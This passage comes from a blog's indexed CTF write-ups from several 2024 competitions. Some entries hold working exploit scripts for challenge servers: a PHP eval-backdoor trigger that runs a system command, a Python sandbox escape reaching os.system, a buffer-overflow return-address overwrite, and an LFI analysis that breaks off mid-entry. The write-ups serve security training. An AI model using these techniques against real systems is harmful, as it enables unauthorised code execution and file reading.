","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:11:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"photo-clue - Steganography ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:12:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description A seemingly innocuous old photo file has emerged, but Mary Morse suspects it may hold the key to deciphering The Consortium’s next move. Your task is to analyze the metadata, uncover the true nature of the file, and submit the flag before The Consortium acts. Time is running out—can you crack the mystery behind the photo? (Note: If you choose to use volatility2.6, use profile Win10x64_19041) ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:12:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation Run volatility on the raw file, list all files and you’ll find an Image called REDACTED, extract it, run steghide on it, and you’ll find a pdf file inside. the file is password protected, the password was spooky2024 (You can either guess it or bruteforce it using rockyou.txt). ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:12:2","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"set-your-intentions-right - Steganography ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:13:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Mary and Maya wanted to spend the rest of their Friday evening having more fun. They decided to go raundonauting, they set their intentions to paranormal and it sounds like they needed to end up hiding from what they found. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:13:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation Another easy one, just look at the spectrogram of the audio. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:13:2","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"whispers-in-morse - Steganography ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:14:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Mary got a letter from Maya talking about seeing a cryptid sighting but doesn’t want other people to know, the only thing attached is this picture? She wonders if there could be a secret message hidden inside. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:14:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation Check the strings, last line is “Password: M.A.__.R.Y”, use steghide to get the flag.txt file. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:14:2","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"entangled-server - Web ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:15:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description A NICC agent found an old abandoned server with some very suspicious files on it. We have found the file it was hosting on a webserver but it seems like it was very heavily obfuscated. Can you figure out how to get in? The flag is located at /flag.txt on the server. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:15:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation You’ll have to deobfuscate the code line by line, it’s more of a reverse challenge than a web one. You’ll end up with this code : \u003c?php // Disable error output and execution time limits ini_set(\"error_log\", null); ini_set(\"log_errors\", 0); ini_set(\"max_execution_time\", 0); set_time_limit(0); // Set the authentication flag $flag = \"5p1n-th3-51lly-5tr1ng5\"; // XOR function for encoding and decoding function xorEncrypt($input, $key) { $output = \"\"; $keyLength = strlen($key); for ($i = 0, $j = 0; $i \u003c strlen($input); $i++, $j++) { if ($j == $keyLength) $j = 0; // Repeat the key if it's shorter than input $output .= chr(ord($input[$i]) ^ ord($key[$j])); } return $output; } // Decode function that uses the flag as a key for XOR function doubleXorDecode($input, $key) { global $flag; return xorEncrypt(xorEncrypt($input, $flag), $key); } // Initialize input variables from $_POST $encodedPayload = null; $postKey = null; if (empty($encodedPayload) \u0026\u0026 !empty($_POST)) { foreach ($_POST as $key =\u003e $value) { $encodedPayload = $value; $postKey = $key; break; } } // Decode and check the input if ($encodedPayload) { $decodedInput = json_decode(doubleXorDecode(base64_decode($encodedPayload), $postKey), true); if (isset($decodedInput[\"ak\"]) \u0026\u0026 $decodedInput[\"ak\"] === $flag) { if ($decodedInput[\"a\"] === \"e\") { eval($decodedInput[\"d\"]); } } } exit(); ?\u003e There’s an eval at the code, meaning we can manage to execute cat /flag.txt. BUT, there’s the xor function, but we all know how xor works, it’s reversible. output = “5p1n-th3-51lly-5tr1ng5” xor (input xor key) [!we can choose key and input, remember that!] if key = 0 : output = “5p1n-th3-51lly-5tr1ng5” xor input xor “5p1n-th3-51lly-5tr1ng5” output now matches input. Now it’s simpler. All we need to do is : Create a payload that contains “ak”,“a” and “d”, the payload must be base64 encoded THEN xored with “5p1n-th3-51lly-5tr1ng5” which is our key. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:15:2","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Script import base64 import json import requests payload = { \"ak\": \"5p1n-th3-51lly-5tr1ng5\", \"a\": \"e\", \"d\": \"system('cat /flag.txt');\" } payload = json.dumps(payload) payload = base64.b64encode(payload.encode()).decode() data = \"5p1n-th3-51lly-5tr1ng5=\"+payload headers = {\"Content-Type\": \"Application/X-WWW-FORM-URLENCODED\"} response = requests.post(\"http://entangled-server.niccgetsspooky.xyz:1337/\", data=data, headers=headers) print(response.text) ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:15:3","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Future Plans - Web ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:16:0","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description That mysterious G0ldenFalc0ln7 is up to something. He’s been pretty hard to tie down in the past, but Anna found a blog of his. It looks like he’s gotten around to planning something big. We still don’t know whether he’s good, bad, or just a little bit of both. For all we know, he could be one of our own. With everyone so distracted by the annual release of cryptids and creepy crawlies, he seems to be leveraging the chaos to his advantage to communicate with his faction – whoever that is. Find out what he’s got planned if you can - we need to know what we’re up against before the spring! https://www.niccgetsspooky.xyz ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:16:1","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Hint#1 If you think about it, I think you’ll get it. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:16:2","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Hint#2 If you want the flag: You can read the description You can read the website You can get the flag If you want the ban: You can run a fuzzer or dirbuster ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:16:3","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation This one’s good, really clever. If you read the blog you’ll find this : The challenge revolves around Time, the future, time travel, the abductions, 1973, Ray guns, the borealis, Hyperborea…🎵 Alien, magical, flyin’, and all. 🎵 Right, just add the following header to your request : If-Modified-Since: Fri, 18 Apr 2025 15:14:19 GMT Nothing happens unless you head to plans, that’s where you’ll find your future flag. Congratulations, you have invented time travel. ","date":"2024-10-30","objectID":"/spookyctf-2024-full-writeup/:16:4","tags":["FORENSICS","OSINT","STEGANO","MISC","WEB","REVERSE","SPOOKYCTF",2024],"title":"SpookyCTF 2024 - Full Writeup","uri":"/spookyctf-2024-full-writeup/"},{"categories":["Writeups"],"content":"CyberOdyssey 2024","date":"2024-10-22","objectID":"/easy-license/","tags":["REVERSE","CyberOdyssey",2024],"title":"Cyber Odyssey 2024 - easy license","uri":"/easy-license/"},{"categories":["Writeups"],"content":"Description : Crack a license for JVNE and submit it remotely to get your flag. {% raw %} from string import * def check_first_part(first_part): array = [''] * 8 # Equivalent to char array of size 8 in C# num = 0 while num \u003c 8: num2 = num \u0026 3 c = first_part[num] if num2 == 0: array[num] = chr(ord(c) - 7) elif num2 == 1: array[num] = chr(ord(c) \u0026 ord('f')) elif num2 == 2: array[num] = chr(ord(c) | ord('(')) elif num2 == 3: array[num] = chr(ord(c) ^ ord('a')) array[num] = chr(ord(array[num]) + ord('\\n')) # Adding newline character num += 1 value = ''.join(array) # Equivalent to new string(array) in C# return value i=0 A=\"AAAAAAAA\" c=16 res = [] while(i\u003c8): text = \"S,E{{Lw`\" value = check_first_part(A) if value[i] == text[i]: res.append(c-1) c=16 i+=1 A = list(A) try: A[i] = chr(c) except: print(\"Done\") A = \"\".join(A) c+=1 from z3 import * def solve_second_part(): # Create an array of 8-bit integer variables for each character in the second_part string second_part = [BitVec(f\"second_part_{i}\", 8) for i in range(8)] # Create the solver solver = Solver() # Known target string after the transformation target_string = \"{GI\u00269%@/\" # Create constraints for each character transformation based on the provided C# logic for num in range(8): # Calculate indices and shifts next_num = (num + 1) % 8 num3 = (num // 3) * 3 # Shifts and bitwise operations from the original code num4 = LShR(second_part[next_num], num3 - num + 3) num5 = (second_part[num] \u003c\u003c (num - num3 + 2)) | num4 # Apply the multiplication and modulo operation result = (num5 * ord('%') + num * 7) % 256 # Perform final bitwise manipulations shifted_result = ((result \u003c\u003c 3) | LShR(result, 1)) \u0026 0x0F final_result = shifted_result | (result \u0026 0xF0) # Add constraint that the final result for each character must match the target string solver.add(final_result == ord(target_string[num])) # Add a constraint that ensures the second_part is within ASCII range (0-127) solver.add(second_part[num] \u003e= 0, second_part[num] \u003c= 127) # Find and return the first solution if solver.check() == sat: model = solver.model() solution = [model[second_part[i]].as_long() for i in range(8)] return solution else: return None # Solve for the second_part and print the first solution solution = solve_second_part() res.append(45) res.extend(solution) # Build a bytearray directly from the list of numbers chars = bytearray(res) # Check the byte representation (optional, for debugging) print(chars) # Now send the bytearray over the connection from pwn import * host = \"rev.akasec.club\" port = 7331 # Create a connection to the server connection = remote(host, port) # Send the bytearray directly connection.sendline(chars) connection.interactive() {% endraw %} ","date":"2024-10-22","objectID":"/easy-license/:0:0","tags":["REVERSE","CyberOdyssey",2024],"title":"Cyber Odyssey 2024 - easy license","uri":"/easy-license/"},{"categories":["Writeups"],"content":"Explanation Code should be obvious. First part was brute forced the trad way (chad), second part was brute forced the z3 way (nerd) and then you send your result using pwntools (sigma) ","date":"2024-10-22","objectID":"/easy-license/:1:0","tags":["REVERSE","CyberOdyssey",2024],"title":"Cyber Odyssey 2024 - easy license","uri":"/easy-license/"},{"categories":["Writeups"],"content":"CyberOdyssey 2024","date":"2024-10-22","objectID":"/pyjail/","tags":["MISC","CyberOdyssey",2024],"title":"Cyber Odyssey 2024 - pyJail","uri":"/pyjail/"},{"categories":["Writeups"],"content":"Description : here you go, some free points. import re from pwn import * def craft_num(n): \"\"\" craft symbol-only numbers, in an inefficient way \"\"\" str_0 = \"-([]\u003c[])\" str_1 = \"(-~([]\u003c[]))\" if n == 0: return str_0 ret = f\"{str_1}+\" * n return ret[:-1] def denormalize(str): ret = \"\" for c in str: if c \u003e= \"a\" and c \u003c= \"z\": # https://www.compart.com/en/unicode/U+FF41 # weird fullwidth a # the first of a sequence of codepoints compatible with ASCII letters weird_a = 0xff41 offset = ord(c) - ord(\"a\") ret += chr(weird_a + offset) else: ret += c # replace all underscores that are not at the beginning of an identifier with # https://www.compart.com/en/unicode/U+FF3F # fullwidth underscore ret = re.sub(r\"(?\u003c![\\.\\[\\( ])_\", chr(0xff3f), ret) return ret def craft_os_str(): \"\"\" payload for generating the string \"_os\" \"\"\" underscore_str = f\"().__init__.__name__[{craft_num(0)}]\" # To generate \"_\" s_str = f\"[].__doc__[{craft_num(17)}]\" # To get \"s\" br = \"{}\" o_str = f\"{br}.__class__.__base__.__doc__[{craft_num(15)}]\" # To get \"o\" os_str = f\"({underscore_str})+({o_str})+({s_str})\" return os_str def craft_bash_str(): \"\"\" payload for generating the string \"$0\" \"\"\" num_0_str = f\"({craft_num(0)}).__doc__[{craft_num(33)}]\" # To get \"0\" bash_str = f\"'$'+({num_0_str})\" return bash_str def find_loader_class_with_globals(): \"\"\" Dynamically find a loader class with access to `sys.modules`. \"\"\" for idx, cls in enumerate(object.__subclasses__()): if 'FileLoader' in str(cls): # We are now searching for the right method to access sys.modules. # The get_data method typically exists and may have access to globals. if hasattr(cls, 'get_data'): return idx return None file_loader_idx = find_loader_class_with_globals() if file_loader_idx is not None: # Access the loader class without instantiating it expl_find_FileLoader = f\"().__class__.__base__.__subclasses__()[{craft_num(file_loader_idx)}]\" else: raise Exception(\"FileLoader class not found\") # Access sys.modules via the get_data method (or similar), since we can't use get_source expl_find_os_module = f\"{expl_find_FileLoader}.get_data.__globals__[{craft_os_str()}]\" expl_shell = f\"{expl_find_os_module}.system({craft_bash_str()})\" expl = expl_shell expl = denormalize(expl) print(expl) # Connect and execute #nc misc.akasec.club 4042 #conn = process([\"python\", \"chall.py\"]) conn = remote(\"misc.akasec.club\", 4042) conn.sendlineafter(\"\u003e\", expl.encode()) conn.interactive() ","date":"2024-10-22","objectID":"/pyjail/:0:0","tags":["MISC","CyberOdyssey",2024],"title":"Cyber Odyssey 2024 - pyJail","uri":"/pyjail/"},{"categories":["Writeups"],"content":"Explanation Looked up on google pyjail without characters, found this https://halb.it/posts/bluehens-pyjail/, stole the code, modified it so it looks for another way to access sys.modules (cause different machines different python stuff) ","date":"2024-10-22","objectID":"/pyjail/:1:0","tags":["MISC","CyberOdyssey",2024],"title":"Cyber Odyssey 2024 - pyJail","uri":"/pyjail/"},{"categories":["Writeups"],"content":"CyberOdyssey 2024","date":"2024-10-22","objectID":"/spermpwn/","tags":["PWN","CyberOdyssey",2024],"title":"Cyber Odyssey 2024 - spermPWN","uri":"/spermpwn/"},{"categories":["Writeups"],"content":"Description : here you go, some free points. from pwn import * # Setup pwntools context for 64-bit architecture context(arch='amd64', os='linux') # Start the process #p = process('./chall') #remote nc pwn.akasec.club 2001 p = remote('pwn.akasec.club', 2001) # Load the ELF binary to extract symbols and addresses e = ELF('./chall') # Receive the line containing the address of returnToMePlease func = p.recvline() # The output is something like: b'return to me please : 5555555551c9\\n' # We need to extract the address part (ascii string) from the line func = func[24:len(func)-1] # Extract '5555555551c9' from the output # Convert the ASCII address string to an integer func_addr = int(func, 16) # Add 45 to the extracted address new_func_addr = func_addr + 45 # Convert the new address to little-endian format using p64 new_func_addr_packed = p64(new_func_addr) # Create the payload padding = b\"A\" * 24 # Overflow buffer + overwrite return address payload = padding + new_func_addr_packed # Attach GDB to the running process and set a breakpoint at main+99 # Send the payload p.sendline(payload) # Drop into interactive mode to see the output p.interactive() ","date":"2024-10-22","objectID":"/spermpwn/:0:0","tags":["PWN","CyberOdyssey",2024],"title":"Cyber Odyssey 2024 - spermPWN","uri":"/spermpwn/"},{"categories":["Writeups"],"content":"Explanation at new_func_addr+0, you’ll never spawn a shell because we fill a register with 0 then we compare it with 0x1337. But that’s like having your front door locked but your back door opened…So let’s just go through the back door new_func_addr+45 (As in after the comparison). ","date":"2024-10-22","objectID":"/spermpwn/:1:0","tags":["PWN","CyberOdyssey",2024],"title":"Cyber Odyssey 2024 - spermPWN","uri":"/spermpwn/"},{"categories":["Writeups"],"content":"CyberOdyssey 2024","date":"2024-10-22","objectID":"/trenbolone-acetate/","tags":["CRYPTO","CyberOdyssey",2024],"title":"Cyber Odyssey 2024 - Trenbolone Acetate","uri":"/trenbolone-acetate/"},{"categories":["Writeups"],"content":"Description : The secret sauce for an absolute jacked body. Don’t do steroids it’s a joke. from Crypto.Util.number import long_to_bytes, inverse import math e = 65537 p = 151540898923253505685929590839467610476539231339984453937399928757529520395167994115755166265617251672043185236161363121625933790823240632902021976254031919968575780199199933705267309277878642940651911668712031181453138874513134847392060819408927032892075325270040952708055668741089143717243401303024555257629 encrypted_flag = 6213061180807192415739815333711016988111562303576135330339470059636408074233112487974290853453944378795500648677454310446831080497598536706308919525130382753041308868210555124865365563894231295209406847789139700492617579246791656727794473752764509494122894702123815772569604098471223813782846144047797979345657520483768475791533230791945222842019364670025158190913224854906787657918233677470378026864737296003543227092898384260242969295669650666604488234803081911325558300779526933331511863143988203774745078791286082201176111789407843617087871737182907131976391354352710947506894124712039162324355615970591583578136285884937844591383316460927831119585248295867355518509118831884764827136450010450070265934343691512433524253284928056060091863105849427461369084596539365748642269821391069443866947839616617351739194341117874963950999060124423407441986734132777478083380760473818314838907885843416124676073709655697628403940360968329734360698993661069109722652085496217898423581953205675947718658390795984512062315552317284667690291714469332076299928703391123609350229812485073956041537114028693285475534879628541868617415579992513986642645468833134784231548588984583903835506260531485187800884610679006213100276630339935307150840952713226249931347532045279278215118268385438992250167366269364930946776931389707265502617991108272482670049967105916988888196192859145687509443461186546981510212177501403044418734379759866209723988502606650698445197672529550740315841079862462848534890363809808147377969999560650786221609540304215577993832437196076220744854212702357414546474210605007061113768125837998154189437819203395998510682587941813929433690137095039848084275613972569115237430172703725421367870902993217062907651946128156975591060719852179498213781649011210807237786454815148859194333173193535584082036526067601931323295549369318013515331485172565014950142728200895734651177906250582137670643784513069880832868712423994761333922538304256565697950019163243512102041878559525424518292521612463747754206435564607109912503072216355195489435467099715999255786521948035632410782145850098311065196718416613187441259174861642932047618586688615144619942513479257014417375749254071371536837276997981830243431176791130067739922279581006906811439182648373315921829956514675181203100716700296328787784654386973536345708377536777325133138012365191286732153448547158606700330386833427709248492153511009424456908274963888305035862038933783555402758802731236206121743493634976645526593964689650850895006744203254360944099623965294098736288289053351829469878613135685051999269391849332886444375852690243335974954104494706310895852193958453480881886753137400081873243574388352939211059156296616533689473375846657511230737348968608765369142698806368424200472061900066176512895073185370303590650583228568588583229494975704890960433202469936071967773972676837762662453225024068513452914148946088893961322646101833731972818916704089977744043610532409071754034138085086572181258717069378271881693426890750743179781467837934857210199903393615433162899024580917392568477939895841806361456726090429048829896559086300411931100777178616679944803681014429533466350600732822642994197179853540831724559066366766494412090375596647534610400832392552316461019373504680275883777426106658114855731927413282886197946777560407557517544739953940084236069408451773660814107559154417433422545300933230558417644515040552169031258221109881882517428793692629491168852433274853395006581379865407634805445096595729283963926565977738974108760476989","date":"2024-10-22","objectID":"/trenbolone-acetate/:0:0","tags":["CRYPTO","CyberOdyssey",2024],"title":"Cyber Odyssey 2024 - Trenbolone Acetate","uri":"/trenbolone-acetate/"},{"categories":["Writeups"],"content":"Explanation I’m not a crypto player, this was pure luck. Sometimes you just have to trust nature, one could hit a Rubik’s cube with a wrench and it’ll solve itself. Read the sentence again, it is technically true isn’t it ? If I had to guess, I think the fact that n is not the usual p*q, and the equation could reduce from : $$ C = M^e + p_0 \\cdot q_0 \\cdot p_1 \\cdot q_1 \\cdot k $$ to $$ C\\mod p_1 = M^e \\mod p_1 $$ so we could use p1 to decrypt our flag. ","date":"2024-10-22","objectID":"/trenbolone-acetate/:1:0","tags":["CRYPTO","CyberOdyssey",2024],"title":"Cyber Odyssey 2024 - Trenbolone Acetate","uri":"/trenbolone-acetate/"},{"categories":["Writeups"],"content":"DEADFACE 2024","date":"2024-10-22","objectID":"/winning-factors/","tags":["MISC","DEADFACE",2024],"title":"DEADFACE 2024 - Winning Factors","uri":"/winning-factors/"},{"categories":["Writeups"],"content":"Description : As another test of your programming prowess, Turbo Tactical wants to see if you can write a script to solve mathematic equations being served by a remote server within 3 seconds. #147.182.245.126:33001 #setup pwntools from pwn import * from math import * #connect to the server conn = remote('147.182.245.126', 33001) p = conn.recvline() print(p) n = len(p) number = int(p[27:n-2]) f = factorial(number) print(f) conn.send(str(f).encode()) conn.interactive() ","date":"2024-10-22","objectID":"/winning-factors/:0:0","tags":["MISC","DEADFACE",2024],"title":"DEADFACE 2024 - Winning Factors","uri":"/winning-factors/"},{"categories":["Writeups"],"content":"Explanation Pretty Obvious. ","date":"2024-10-22","objectID":"/winning-factors/:1:0","tags":["MISC","DEADFACE",2024],"title":"DEADFACE 2024 - Winning Factors","uri":"/winning-factors/"},{"categories":["Writeups"],"content":"CSAW 2024 - Obfuscation","date":"2024-10-11","objectID":"/obfuscation/","tags":["REVERSE","CSAW",2024],"title":"CSAW 2024 - Obfuscation","uri":"/obfuscation/"},{"categories":["Writeups"],"content":"The goal of this challenge is to reverse this highly obfuscated binary and get the correct passphrase ","date":"2024-10-11","objectID":"/obfuscation/:0:0","tags":["REVERSE","CSAW",2024],"title":"CSAW 2024 - Obfuscation","uri":"/obfuscation/"},{"categories":["Writeups"],"content":"Explanation The program asks for a passphrase, because of that and the name of the program I assumed there would some passphrase obfuscated, so I decompiled it : Couldn’t understand anything so I checked if maybe it was packed ? Nope, okay we’ll let’s use BinaryNinja then : 93A3 is our function, so let’s set a breakpoint at the start of it and see what happens to our input : Before : After : Interesting, looks like there’s a mapping function, I sent another input just to make sure and it’s probably the case : Before : After : But then I got stuck So I tried strace and saw this : I needed to find where this happens, so I went back and checked if rand gets called Let’s put a breakpoint on rand and spam continue until I find which function calls it and there it is : at 818e6 now we’ll see what happens with this rand call after spamming it after 34 times we finally stop calling rand, this probably means that the flag is 34 characters long. What I did was make rand always return 0 and see what happens. After trial and error, I found this line that compares our result with the expected result : “0xcd” is our input since A turns to 0xcd and we are comparing it with 0xa5 so there’s probably a xor with the LSB of the rand value, let’s try setting back to generating random values. let’s input “a” : Then I wondered : how can I solve this challenge if the values are random each time yet the compared value is always the same ? so I wrote “a” again : Same result. So it looks like I’ll have to resort to the old reliable : guessing one character at a time. After hours I finally found it : wh47 15 7h3 r1ck 457l3y p4r4d0x? Fun. ","date":"2024-10-11","objectID":"/obfuscation/:1:0","tags":["REVERSE","CSAW",2024],"title":"CSAW 2024 - Obfuscation","uri":"/obfuscation/"},{"categories":["Writeups"],"content":"R code (worst language ever)","date":"2024-09-02","objectID":"/blackhatmea-2024-rd-what-now/","tags":["REVERSE","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - RD What Now?","uri":"/blackhatmea-2024-rd-what-now/"},{"categories":["Writeups"],"content":"I have some files missing but I think I can figure it out anyways. ","date":"2024-09-02","objectID":"/blackhatmea-2024-rd-what-now/:0:0","tags":["REVERSE","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - RD What Now?","uri":"/blackhatmea-2024-rd-what-now/"},{"categories":["Writeups"],"content":"Explanation Typical “Z3 solver/whole lotta conditions” challenge, but written in R. We start with a file that contains a bunch of zlib files. We can use binwalk to extract these files. The files contain a bunch of non sense and couple strings like 0.0.9000, quick google search and we find that it has something to do with R : Now apparently in R you can read these “rds” files : And there you go, a bunch of functions that tell you what each character in the flag string should equal to, you can use a z3solver script to get the flag…I don’t have a script because I manually calculated everything by hand. Then there’s the big xor function function () { if (exists(\"flag\", envir = .GlobalEnv)) { flag_value \u003c- get(\"flag\", envir = .GlobalEnv) if (is.character(flag_value)) { xor_key \u003c- \"BHMEAISTHEBESTCTFEVERBETTERTHANALLOFTHEOTHERCTF\" key_length \u003c- nchar(xor_key) flag_length \u003c- nchar(flag_value) if (flag_length != key_length) { xor_key \u003c- substr(rep(xor_key, length.out = ceiling(flag_length/key_length)), 1, flag_length) } xor_result \u003c- sapply(1:flag_length, function(i) { flag_char \u003c- substr(flag_value, i, i) key_char \u003c- substr(xor_key, i, i) int_val \u003c- as.integer(charToRaw(flag_char)) xor_val \u003c- as.integer(charToRaw(key_char)) xored_val \u003c- bitwXor(int_val, xor_val) as.raw(xored_val) }) return(paste0(xor_result, collapse = \"\")) } } else { system(\"echo 'try better next time'\") } } Run the function and get the flag (or rewrite it in another language if you want) (Keep in mind the non xored flag should be in hexadecimal and not as a string for this xor operation to work.) ","date":"2024-09-02","objectID":"/blackhatmea-2024-rd-what-now/:1:0","tags":["REVERSE","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - RD What Now?","uri":"/blackhatmea-2024-rd-what-now/"},{"categories":["Writeups"],"content":"Some russian malware","date":"2024-09-02","objectID":"/blackhatmea-2024-stealer/","tags":["REVERSE","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Stealer","uri":"/blackhatmea-2024-stealer/"},{"categories":["Writeups"],"content":"We received a phishing email within which we have found this file. We believe this executable acts as some sort of credential stealer. Note: This is a defused real malware, consider disabling your AV. ","date":"2024-09-02","objectID":"/blackhatmea-2024-stealer/:0:0","tags":["REVERSE","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Stealer","uri":"/blackhatmea-2024-stealer/"},{"categories":["Writeups"],"content":"Explanation The file is a .Net 32-bit executable, therefore we can use DnSpy to decompile it. You’ll find that it’s a bunch of obfuscated code, so we’ll use a tool called de4dot to clean our code. Inside the code there’s this interesting function that always gets called whenever the code gathers data from the victim : // Token: 0x06000044 RID: 68 public static string smethod_16(string string_30, string string_31) { string text = \"\"; try { DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider(); HashAlgorithm hashAlgorithm = new MD5CryptoServiceProvider(); byte[] array = new byte[8]; Array.Copy(hashAlgorithm.ComputeHash(Encoding.ASCII.GetBytes(string_31)), 0, array, 0, 8); descryptoServiceProvider.Key = array; descryptoServiceProvider.Mode = CipherMode.ECB; ICryptoTransform cryptoTransform = descryptoServiceProvider.CreateDecryptor(); byte[] array2 = Convert.FromBase64String(string_30); text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length)); } catch (Exception) { } Console.WriteLine(\"probably flag\"); Console.WriteLine(text); return text; } I added the console lines to extract the content of text so whenever the function is called we get to see what’s happening. I ran the code and got this : 7267561120:QkhGbGFnWXt0M2xlZ3I0bV9nMGVzX3chbGR9 QkhGbGFnWXt0M2xlZ3I0bV9nMGVzX3chbGR9 is the flag in base64. ","date":"2024-09-02","objectID":"/blackhatmea-2024-stealer/:1:0","tags":["REVERSE","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Stealer","uri":"/blackhatmea-2024-stealer/"},{"categories":["Writeups"],"content":"php filter chain exploit","date":"2024-09-02","objectID":"/blackhatmea-2024-free-flag/","tags":["WEB","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Free Flag","uri":"/blackhatmea-2024-free-flag/"},{"categories":["Writeups"],"content":"Free Free ","date":"2024-09-02","objectID":"/blackhatmea-2024-free-flag/:0:0","tags":["WEB","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Free Flag","uri":"/blackhatmea-2024-free-flag/"},{"categories":["Writeups"],"content":"Explanation Let’s take a look at the code : \u003c?php function isRateLimited($limitTime = 1) { $ipAddress=$_SERVER['REMOTE_ADDR']; $filename = sys_get_temp_dir() . \"/rate_limit_\" . md5($ipAddress); $lastRequestTime = @file_get_contents($filename); if ($lastRequestTime !== false \u0026\u0026 (time() - $lastRequestTime) \u003c $limitTime) { return true; } file_put_contents($filename, time()); return false; } if(isset($_POST['file'])) { if(isRateLimited()) { die(\"Limited 1 req per second\"); } $file = $_POST['file']; if(substr(file_get_contents($file),0,5) !== \"\u003c?php\" \u0026\u0026 substr(file_get_contents($file),0,5) !== \"\u003chtml\") { die(\"catched\"); } else { echo file_get_contents($file); } } ?\u003e ","date":"2024-09-02","objectID":"/blackhatmea-2024-free-flag/:1:0","tags":["WEB","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Free Flag","uri":"/blackhatmea-2024-free-flag/"},{"categories":["Writeups"],"content":"Vulnerability There’s an LFI vulnerability in the code : $file = $_POST['file']; if(substr(file_get_contents($file),0,5) !== \"\u003c?php\" \u0026\u0026 substr(file_get_contents($file),0,5) !== \"\u003chtml\") { die(\"catched\"); } else { echo 